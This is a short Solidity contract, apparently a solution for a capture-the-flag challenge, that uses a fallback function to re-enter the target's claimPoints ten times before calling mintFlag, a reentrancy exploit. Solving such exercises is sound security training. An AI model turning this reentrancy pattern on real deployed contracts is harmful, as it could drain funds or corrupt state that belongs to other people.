// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

contract CtfChallenge5 {
    IChallenge5 public challenge;
    uint256 public callCount = 0;
    uint256 public constant TARGET = 10;

    constructor(address _challengeAddress) {
        challenge = IChallenge5(_challengeAddress);
    }

    function startClaim() external {
        callCount = 0;
        challenge.claimPoints();
    }

    // receive() external payable {
    //     if (callCount < TARGET) {
    //         callCount++;
    //         challenge.claimPoints();
    //     } else if (callCount == TARGET) {
    //         callCount++;
    //         challenge.mintFlag();
    //     }
    // }

    fallback() external {
        if (callCount < TARGET) {
            callCount++;
            challenge.claimPoints();
        } else if (callCount == TARGET) {
            callCount++;
            challenge.mintFlag();
        }
    }
}


interface IChallenge5 {
    function claimPoints() external;
    function mintFlag() external;
    function resetPoints() external;
}